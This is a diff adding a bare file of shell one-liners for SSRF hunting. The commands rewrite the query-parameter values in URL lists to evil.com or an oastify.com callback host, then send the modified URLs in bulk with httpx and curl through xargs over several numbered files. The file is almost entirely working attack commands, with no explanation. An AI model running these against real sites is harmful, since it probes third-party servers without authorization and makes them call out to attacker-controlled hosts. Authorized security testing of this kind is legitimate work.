@@ -1,0 +1,24 @@
+cat urls.txt | grep "=" | sed 's/=[^&]*/=http:\/\/evil.com/g' > modified.txt
+
+cat urls.txt | grep "=" | sed 's/=[^&]*/=https:\/\/evil.com/g' > ssrf.txt
+
+cat payloads.txt | httpx -fr -silent
+
+cat payloads.txt | xargs -I {} curl -s -L {}
+
+cat urls.txt | grep "=" | qsreplace "http://your-sub.oastify.com" > payloads.txt
+
+
+=--------------------=
+
+cat urls.txt | grep "=" | sed 's/=[^&]*/=https:\/\/evil.com/g' > ssrf.txt
+cat 1.txt | xargs -I {} curl -s -L {}
+cat 2.txt | xargs -I {} curl -s -L {}
+cat 3.txt | xargs -I {} curl -s -L {}
+cat 4.txt | xargs -I {} curl -s -L {}
+cat 5.txt | xargs -I {} curl -s -L {}
+cat 6.txt | xargs -I {} curl -s -L {}
+cat 7.txt | xargs -I {} curl -s -L {}
+cat 8.txt | xargs -I {} curl -s -L {}
+cat 9.txt | xargs -I {} curl -s -L {}
+
